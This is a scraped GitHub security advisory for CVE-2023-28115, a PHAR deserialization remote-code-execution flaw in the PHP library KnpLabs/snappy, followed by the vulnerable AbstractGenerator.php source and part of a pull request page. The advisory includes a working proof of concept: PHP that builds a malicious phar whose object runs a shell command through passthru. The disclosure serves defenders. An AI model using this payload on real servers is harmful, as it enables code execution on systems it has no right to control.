  7](/KnpLabs/snappy/pulls)
* [Discussions](/KnpLabs/snappy/discussions)
* [Actions](/KnpLabs/snappy/actions)
* [Projects
  0](/KnpLabs/snappy/projects)
* [Security](/KnpLabs/snappy/security)
* [Insights](/KnpLabs/snappy/pulse)

Additional navigation options

* [Code](/KnpLabs/snappy)
* [Issues](/KnpLabs/snappy/issues)
* [Pull requests](/KnpLabs/snappy/pulls)
* [Discussions](/KnpLabs/snappy/discussions)
* [Actions](/KnpLabs/snappy/actions)
* [Projects](/KnpLabs/snappy/projects)
* [Security](/KnpLabs/snappy/security)
* [Insights](/KnpLabs/snappy/pulse)

# PHAR deserialization allowing remote code execution

Critical

[AntoineLelaisant](/AntoineLelaisant)
published
GHSA-gq6w-q6wh-jggc
Mar 17, 2023

## Package

composer

KnpLabs/snappy
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

<= 1.4.1

## Patched versions

>= 1.4.2

## Description

## Description

snappy is vulnerable to PHAR deserialization due to a lack of checking on the protocol before passing it into the `file_exists()` function. If an attacker can upload files of any type to the server he can pass in the phar:// protocol to unserialize the uploaded file and instantiate arbitrary PHP objects. This can lead to remote code execution especially when snappy is used with frameworks with documented POP chains like Laravel/Symfony vulnerable developer code. If user can control the output file from the `generateFromHtml()` function, it will invoke deserialization.

## Proof of Concept

Install Snappy via composer require `knplabs/knp-snappy`. After that, under snappy directory, create an `index.php` file with this vulnerable code.

```
<?php
// index.php

// include autoloader
require __DIR__ . '/vendor/autoload.php';

// reference the snappy namespace
use Knp\Snappy\Pdf;

// vulnerable object
class VulnerableClass {
    public $fileName;
    public $callback;

    function __destruct() {
        call_user_func($this->callback, $this->fileName);
    }
}

$snappy = new Pdf('/usr/local/bin/wkhtmltopdf');
// generate pdf from html content and save it at phar://poc.phar
$snappy->generateFromHtml('<h1>Bill</h1><p>You owe me money, dude.</p>', 'phar://poc.phar');
```

As an attacker, we going to generate the malicious phar using this script.

```
<?php
// generate_phar.php

class VulnerableClass { }
// Create a new instance of the Dummy class and modify its property
$dummy = new VulnerableClass();
$dummy->callback = "passthru";
$dummy->fileName = "uname -a > pwned"; //our payload

// Delete any existing PHAR archive with that name
@unlink("poc.phar");

// Create a new archive
$poc = new Phar("poc.phar");

// Add all write operations to a buffer, without modifying the archive on disk
$poc->startBuffering();

// Set the stub
$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

// Add a new file in the archive with "text" as its content
$poc["file"] = "text";

// Add the dummy object to the metadata. This will be serialized
$poc->setMetadata($dummy);

// Stop buffering and write changes to disk
$poc->stopBuffering();
?>
```

Then run these command to generate the file

```
php --define phar.readonly=0 generate_phar.php
```

Then execute index.php with `php index.php`. You will see a file named `pwned` will be created. Noted that attacker can upload a file with any extension such as .png or .jpeg. So poc.jpeg also will do the trick.

## Impact

This vulnerability is capable of remote code execution if Snappy is used with frameworks or developer code with vulnerable POP chains.

## Occurences

[snappy/src/Knp/Snappy/AbstractGenerator.php](https://github.com/KnpLabs/snappy/blob/5126fb5b335ec929a226314d40cd8dad497c3d67/src/Knp/Snappy/AbstractGenerator.php#L670)

Line 670
in
[5126fb5](/KnpLabs/snappy/commit/5126fb5b335ec929a226314d40cd8dad497c3d67)

|  | protected function fileExists($filename) |
| --- | --- |

## References

* <https://huntr.dev/bounties/0bdddc12-ff67-4815-ab9f-6011a974f48e/>

### Severity

Critical

9.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

### CVE ID

CVE-2023-28115

### Weaknesses

[CWE-502](/advisories?query=cwe%3A502)

### Credits

* [![@psmoros](https://avatars.githubusercontent.com/u/17127410?s=40&v=4)](/psmoros)
  [psmoros](/psmoros)
  Reporter
* [![@nightfury99](https://avatars.githubusercontent.com/u/32232422?s=40&v=4)](/nightfury99)
  [nightfury99](/nightfury99)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_7e40e3ad_20250114_194148.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKnpLabs%2Fsnappy%2Fblob%2F5126fb5b335ec929a226314d40cd8dad497c3d67%2Fsrc%2FKnp%2FSnappy%2FAbstractGenerator.php)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKnpLabs%2Fsnappy%2Fblob%2F5126fb5b335ec929a226314d40cd8dad497c3d67%2Fsrc%2FKnp%2FSnappy%2FAbstractGenerator.php)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=KnpLabs%2Fsnappy)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[KnpLabs](/KnpLabs)
/
**[snappy](/KnpLabs/snappy)**
Public

* [Notifications](/login?return_to=%2FKnpLabs%2Fsnappy) You must be signed in to change notification settings
* [Fork
  438](/login?return_to=%2FKnpLabs%2Fsnappy)
* [Star
   4.4k](/login?return_to=%2FKnpLabs%2Fsnappy)

* [Code](/KnpLabs/snappy)
* [Issues
  5](/KnpLabs/snappy/issues)
* [Pull requests
  7](/KnpLabs/snappy/pulls)
* [Discussions](/KnpLabs/snappy/discussions)
* [Actions](/KnpLabs/snappy/actions)
* [Projects
  0](/KnpLabs/snappy/projects)
* [Security](/KnpLabs/snappy/security)
* [Insights](/KnpLabs/snappy/pulse)

Additional navigation options

* [Code](/KnpLabs/snappy)
* [Issues](/KnpLabs/snappy/issues)
* [Pull requests](/KnpLabs/snappy/pulls)
* [Discussions](/KnpLabs/snappy/discussions)
* [Actions](/KnpLabs/snappy/actions)
* [Projects](/KnpLabs/snappy/projects)
* [Security](/KnpLabs/snappy/security)
* [Insights](/KnpLabs/snappy/pulse)

## Files

 5126fb5
## Breadcrumbs

1. [snappy](/KnpLabs/snappy/tree/5126fb5b335ec929a226314d40cd8dad497c3d67)
2. /[src](/KnpLabs/snappy/tree/5126fb5b335ec929a226314d40cd8dad497c3d67/src)
3. /[Knp](/KnpLabs/snappy/tree/5126fb5b335ec929a226314d40cd8dad497c3d67/src/Knp)
4. /[Snappy](/KnpLabs/snappy/tree/5126fb5b335ec929a226314d40cd8dad497c3d67/src/Knp/Snappy)
/
# AbstractGenerator.php

Copy path Blame  Blame
## Latest commit

## History

[History](/KnpLabs/snappy/commits/5126fb5b335ec929a226314d40cd8dad497c3d67/src/Knp/Snappy/AbstractGenerator.php)740 lines (646 loc) · 19.3 KB 5126fb5
## Breadcrumbs

1. [snappy](/KnpLabs/snappy/tree/5126fb5b335ec929a226314d40cd8dad497c3d67)
2. /[src](/KnpLabs/snappy/tree/5126fb5b335ec929a226314d40cd8dad497c3d67/src)
3. /[Knp](/KnpLabs/snappy/tree/5126fb5b335ec929a226314d40cd8dad497c3d67/src/Knp)
4. /[Snappy](/KnpLabs/snappy/tree/5126fb5b335ec929a226314d40cd8dad497c3d67/src/Knp/Snappy)
/
# AbstractGenerator.php

Top
## File metadata and controls

* Code
* Blame

740 lines (646 loc) · 19.3 KB[Raw](https://github.com/KnpLabs/snappy/raw/5126fb5b335ec929a226314d40cd8dad497c3d67/src/Knp/Snappy/AbstractGenerator.php)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740<?php
namespace Knp\Snappy;
use Knp\Snappy\Exception\FileAlreadyExistsException;use Psr\Log\LoggerAwareInterface;use Psr\Log\LoggerAwareTrait;use Symfony\Component\Process\Process;use Exception;use LogicException;use RuntimeException;use InvalidArgumentException;
/\*\* \* Base generator class for medias. \* \* @author Matthieu Bontemps <matthieu.bontemps@knplabs.com> \* @author Antoine Hérault <antoine.herault@knplabs.com> \*/abstract class AbstractGenerator implements GeneratorInterface, LoggerAwareInterface{ use LoggerAwareTrait;
 /\*\* \* @var array \*/ public $temporaryFiles = [];
 /\*\* \* @var string \*/ protected $temporaryFolder;
 /\*\* \* @var null|string \*/ private $binary;
 /\*\* \* @var array \*/ private $options = [];
 /\*\* \* @var null|array \*/ private $env;
 /\*\* \* @var null|int \*/ private $timeout;
 /\*\* \* @var string \*/ private $defaultExtension;
 /\*\* \* @param null|string $binary \* @param array $options \* @param null|array $env \*/ public function \_\_construct($binary, array $options = [], array $env = null) { $this->configure();
 $this->setBinary($binary); $this->setOptions($options); $this->env = empty($env) ? null : $env;
 if (\is\_callable([$this, 'removeTemporaryFiles'])) { \register\_shutdown\_function([$this, 'removeTemporaryFiles']); } }
 public function \_\_destruct() { $this->removeTemporaryFiles(); }
 /\*\* \* Sets the default extension. \* Useful when letting Snappy deal with file creation. \* \* @param string $defaultExtension \* \* @return $this \*/ public function setDefaultExtension($defaultExtension) { $this->defaultExtension = $defaultExtension;
 return $this; }
 /\*\* \* Gets the default extension. \* \* @return string \*/ public function getDefaultExtension(): string { return $this->defaultExtension; }
 /\*\* \* Sets an option. Be aware that option values are NOT validated and that \* it is your responsibility to validate user inputs. \* \* @param string $name The option to set \* @param mixed $value The value (NULL to unset) \* \* @throws InvalidArgumentException \* \* @return $this \*/ public function setOption($name, $value) { if (!\array\_key\_exists($name, $this->options)) { throw new InvalidArgumentException(\sprintf('The option \'%s\' does not exist.', $name)); }
 $this->options[$name] = $value;
 if (null !== $this->logger) { $this->logger->debug(\sprintf('Set option "%s".', $name), ['value' => $value]); }
 return $this; }
 /\*\* \* Sets the timeout. \* \* @param null|int $timeout The timeout to set \* \* @return $this \*/ public function setTimeout($timeout) { $this->timeout = $timeout;
 return $this; }
 /\*\* \* Sets an array of options. \* \* @param array $options An associative array of options as name/value \* \* @return $this \*/ public function setOptions(array $options) { foreach ($options as $name => $value) { $this->setOption($name, $value); }
 return $this; }
 /\*\* \* Returns all the options. \* \* @return array \*/ public function getOptions() { return $this->options; }
 /\*\* \* {@inheritdoc} \*/ public function generate($input, $output, array $options = [], $overwrite = false) { $this->prepareOutput($output, $overwrite);
 $command = $this->getCommand($input, $output, $options);
 $inputFiles = \is\_array($input) ? \implode('", "', $input) : $input;
 if (null !== $this->logger) { $this->logger->info(\sprintf('Generate from file(s) "%s" to file "%s".', $inputFiles, $output), [ 'command' => $command, 'env' => $this->env, 'timeout' => $this->timeout, ]); }
 try { list($status, $stdout, $stderr) = $this->executeCommand($command); $this->checkProcessStatus($status, $stdout, $stderr, $command); $this->checkOutput($output, $command); } catch (Exception $e) { if (null !== $this->logger) { $this->logger->error(\sprintf('An error happened while generating "%s".', $output), [ 'command' => $command, 'status' => $status ?? null, 'stdout' => $stdout ?? null, 'stderr' => $stderr ?? null, ]); }
 throw $e; }
 if (null !== $this->logger) { $this->logger->info(\sprintf('File "%s" has been successfully generated.', $output), [ 'command' => $command, 'stdout' => $stdout, 'stderr' => $stderr, ]); } }
 /\*\* \* {@inheritdoc} \*/ public function generateFromHtml($html, $output, array $options = [], $overwrite = false) { $fileNames = []; if (\is\_array($html)) { foreach ($html as $htmlInput) { $fileNames[] = $this->createTemporaryFile($htmlInput, 'html'); } } else { $fileNames[] = $this->createTemporaryFile($html, 'html'); }
 $this->generate($fileNames, $output, $options, $overwrite); }
 /\*\* \* {@inheritdoc} \*/ public function getOutput($input, array $options = []) { $filename = $this->createTemporaryFile(null, $this->getDefaultExtension());
 $this->generate($input, $filename, $options);
 return $this->getFileContents($filename); }
 /\*\* \* {@inheritdoc} \*/ public function getOutputFromHtml($html, array $options = []) { $fileNames = []; if (\is\_array($html)) { foreach ($html as $htmlInput) { $fileNames[] = $this->createTemporaryFile($htmlInput, 'html'); } } else { $fileNames[] = $this->createTemporaryFile($html, 'html'); }
 return $this->getOutput($fileNames, $options); }
 /\*\* \* Defines the binary. \* \* @param null|string $binary The path/name of the binary \* \* @return $this \*/ public function setBinary($binary) { $this->binary = $binary;
 return $this; }
 /\*\* \* Returns the binary. \* \* @return null|string \*/ public function getBinary() { return $this->binary; }
 /\*\* \* Returns the command for the given input and output files. \* \* @param array|string $input The input file \* @param string $output The ouput file \* @param array $options An optional array of options that will be used \* only for this command \* \* @return string \*/ public function getCommand($input, $output, array $options = []) { if (null === $this->binary) { throw new LogicException('You must define a binary prior to conversion.'); }
 $options = $this->mergeOptions($options);
 return $this->buildCommand($this->binary, $input, $output, $options); }
 /\*\* \* Removes all temporary files. \* \* @return void \*/ public function removeTemporaryFiles() { foreach ($this->temporaryFiles as $file) { $this->unlink($file); } }
 /\*\* \* Get TemporaryFolder. \* \* @return string \*/ public function getTemporaryFolder() { if ($this->temporaryFolder === null) { return \sys\_get\_temp\_dir(); }
 return $this->temporaryFolder; }
 /\*\* \* Set temporaryFolder. \* \* @param string $temporaryFolder \* \* @return $this \*/ public function setTemporaryFolder($temporaryFolder) { $this->temporaryFolder = $temporaryFolder;
 return $this; }
 /\*\* \* Reset all options to their initial values. \* \* @return void \*/ public function resetOptions() { $this->options = []; $this->configure(); }
 /\*\* \* This method must configure the media options. \* \* @return void \* \* @see AbstractGenerator::addOption() \*/ abstract protected function configure();
 /\*\* \* Adds an option. \* \* @param string $name The name \* @param mixed $default An optional default value \* \* @throws InvalidArgumentException \* \* @return $this \*/ protected function addOption($name, $default = null) { if (\array\_key\_exists($name, $this->options)) { throw new InvalidArgumentException(\sprintf('The option \'%s\' already exists.', $name)); }
 $this->options[$name] = $default;
 return $this; }
 /\*\* \* Adds an array of options. \* \* @param array $options \* \* @return $this \*/ protected function addOptions(array $options) { foreach ($options as $name => $default) { $this->addOption($name, $default); }
 return $this; }
 /\*\* \* Merges the given array of options to the instance options and returns \* the result options array. It does NOT change the instance options. \* \* @param array $options \* \* @throws InvalidArgumentException \* \* @return array \*/ protected function mergeOptions(array $options) { $mergedOptions = $this->options;
 foreach ($options as $name => $value) { if (!\array\_key\_exists($name, $mergedOptions)) { throw new InvalidArgumentException(\sprintf('The option \'%s\' does not exist.', $name)); }
 $mergedOptions[$name] = $value; }
 return $mergedOptions; }
 /\*\* \* Checks the specified output. \* \* @param string $output The output filename \* @param string $command The generation command \* \* @throws RuntimeException if the output file generation failed \* \* @return void \*/ protected function checkOutput($output, $command) { // the output file must exist if (!$this->fileExists($output)) { throw new RuntimeException(\sprintf('The file \'%s\' was not created (command: %s).', $output, $command)); }
 // the output file must not be empty if (0 === $this->filesize($output)) { throw new RuntimeException(\sprintf('The file \'%s\' was created but is empty (command: %s).', $output, $command)); } }
 /\*\* \* Checks the process return status. \* \* @param int $status The exit status code \* @param string $stdout The stdout content \* @param string $stderr The stderr content \* @param string $command The run command \* \* @throws RuntimeException if the output file generation failed \* \* @return void \*/ protected function checkProcessStatus($status, $stdout, $stderr, $command) { if (0 !== $status && '' !== $stderr) { throw new RuntimeException(\sprintf('The exit status code \'%s\' says something went wrong:' . "\n" . 'stderr: "%s"' . "\n" . 'stdout: "%s"' . "\n" . 'command: %s.', $status, $stderr, $stdout, $command), $status); } }
 /\*\* \* Creates a temporary file. \* The file is not created if the $content argument is null. \* \* @param null|string $content Optional content for the temporary file \* @param null|string $extension An optional extension for the filename \* \* @return string The filename \*/ protected function createTemporaryFile($content = null, $extension = null) { $dir = \rtrim($this->getTemporaryFolder(), \DIRECTORY\_SEPARATOR);
 if (!\is\_dir($dir)) { if (false === @\mkdir($dir, 0777, true) && !\is\_dir($dir)) { throw new RuntimeException(\sprintf("Unable to create directory: %s\n", $dir)); } } elseif (!\is\_writable($dir)) { throw new RuntimeException(\sprintf("Unable to write in directory: %s\n", $dir)); }
 $filename = $dir . \DIRECTORY\_SEPARATOR . \uniqid('knp\_snappy', true);
 if (null !== $extension) { $filename .= '.' . $extension; }
 if (null !== $content) { \file\_put\_contents($filename, $content); }
 $this->temporaryFiles[] = $filename;
 return $filename; }
 /\*\* \* Builds the command string. \* \* @param string $binary The binary path/name \* @param array|string $input Url(s) or file location(s) of the page(s) to process \* @param string $output File location to the image-to-be \* @param array $options An array of options \* \* @return string \*/ protected function buildCommand($binary, $input, $output, array $options = []) { $command = $binary; $escapedBinary = \escapeshellarg($binary); if (\is\_executable($escapedBinary)) { $command = $escapedBinary; }
 foreach ($options as $key => $option) { if (null !== $option && false !== $option) { if (true === $option) { // Dont't put '--' if option is 'toc'. if ($key === 'toc') { $command .= ' ' . $key; } else { $command .= ' --' . $key; } } elseif (\is\_array($option)) { if ($this->isAssociativeArray($option)) { foreach ($option as $k => $v) { $command .= ' --' . $key . ' ' . \escapeshellarg($k) . ' ' . \escapeshellarg($v); } } else { foreach ($option as $v) { $command .= ' --' . $key . ' ' . \escapeshellarg($v); } } } else { // Dont't add '--' if option is "cover" or "toc". if (\in\_array($key, ['toc', 'cover'])) { $command .= ' ' . $key . ' ' . \escapeshellarg($option); } elseif (\in\_array($key, ['image-dpi', 'image-quality'])) { $command .= ' --' . $key . ' ' . (int) $option; } else { $command .= ' --' . $key . ' ' . \escapeshellarg($option); } } } }
 if (\is\_array($input)) { foreach ($input as $i) { $command .= ' ' . \escapeshellarg($i) . ' '; } $command .= \escapeshellarg($output); } else { $command .= ' ' . \escapeshellarg($input) . ' ' . \escapeshellarg($output); }
 return $command; }
 /\*\* \* Return true if the array is an associative array \* and not an indexed array. \* \* @param array $array \* \* @return bool \*/ protected function isAssociativeArray(array $array) { return (bool) \count(\array\_filter(\array\_keys($array), 'is\_string')); }
 /\*\* \* Executes the given command via shell and returns the complete output as \* a string. \* \* @param string $command \* \* @return array [status, stdout, stderr] \*/ protected function executeCommand($command) { if (\method\_exists(Process::class, 'fromShellCommandline')) { $process = Process::fromShellCommandline($command, null, $this->env); } else { $process = new Process($command, null, $this->env); }
 if (null !== $this->timeout) { $process->setTimeout($this->timeout); }
 $process->run();
 return [ $process->getExitCode(), $process->getOutput(), $process->getErrorOutput(), ]; }
 /\*\* \* Prepares the specified output. \* \* @param string $filename The output filename \* @param bool $overwrite Whether to overwrite the file if it already \* exist \* \* @throws FileAlreadyExistsException \* @throws RuntimeException \* @throws InvalidArgumentException \* \* @return void \*/ protected function prepareOutput($filename, $overwrite) { $directory = \dirname($filename);
 if ($this->fileExists($filename)) { if (!$this->isFile($filename)) { throw new InvalidArgumentException(\sprintf('The output file \'%s\' already exists and it is a %s.', $filename, $this->isDir($filename) ? 'directory' : 'link')); } if (false === $overwrite) { throw new FileAlreadyExistsException(\sprintf('The output file \'%s\' already exists.', $filename)); } if (!$this->unlink($filename)) { throw new RuntimeException(\sprintf('Could not delete already existing output file \'%s\'.', $filename)); } } elseif (!$this->isDir($directory) && !$this->mkdir($directory)) { throw new RuntimeException(\sprintf('The output file\'s directory \'%s\' could not be created.', $directory)); } }
 /\*\* \* Wrapper for the "file\_get\_contents" function. \* \* @param string $filename \* \* @return string \*/ protected function getFileContents($filename) { $fileContent = \file\_get\_contents($filename);
 if (false === $fileContent) { throw new RuntimeException(\sprintf('Could not read file \'%s\' content.', $filename)); }
 return $fileContent; }
 /\*\* \* Wrapper for the "file\_exists" function. \* \* @param string $filename \* \* @return bool \*/ protected function fileExists($filename) { return \file\_exists($filename); }
 /\*\* \* Wrapper for the "is\_file" method. \* \* @param string $filename \* \* @return bool \*/ protected function isFile($filename) { return \strlen($filename) <= \PHP\_MAXPATHLEN && \is\_file($filename); }
 /\*\* \* Wrapper for the "filesize" function. \* \* @param string $filename \* \* @return int \*/ protected function filesize($filename) { $filesize = \filesize($filename);
 if (false === $filesize) { throw new RuntimeException(\sprintf('Could not read file \'%s\' size.', $filename)); }
 return $filesize; }
 /\*\* \* Wrapper for the "unlink" function. \* \* @param string $filename \* \* @return bool \*/ protected function unlink($filename) { return $this->fileExists($filename) ? \unlink($filename) : false; }
 /\*\* \* Wrapper for the "is\_dir" function. \* \* @param string $filename \* \* @return bool \*/ protected function isDir($filename) { return \is\_dir($filename); }
 /\*\* \* Wrapper for the mkdir function. \* \* @param string $pathname \* \* @return bool \*/ protected function mkdir($pathname) { return \mkdir($pathname, 0777, true); }}

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_20a492c7_20250114_194152.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKnpLabs%2Fsnappy%2Fpull%2F469)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FKnpLabs%2Fsnappy%2Fpull%2F469)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=KnpLabs%2Fsnappy)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[KnpLabs](/KnpLabs)
/
**[snappy](/KnpLabs/snappy)**
Public

* [Notifications](/login?return_to=%2FKnpLabs%2Fsnappy) You must be signed in to change notification settings
* [Fork
  438](/login?return_to=%2FKnpLabs%2Fsnappy)
* [Star
   4.4k](/login?return_to=%2FKnpLabs%2Fsnappy)

* [Code](/KnpLabs/snappy)
* [Issues
  5](/KnpLabs/snappy/issues)
* [Pull requests
  7](/KnpLabs/snappy/pulls)
* [Discussions](/KnpLabs/snappy/discussions)
* [Actions](/KnpLabs/snappy/actions)
* [Projects
  0](/KnpLabs/snappy/projects)
* [Security](/KnpLabs/snappy/security)
* [Insights](/KnpLabs/snappy/pulse)

Additional navigation options

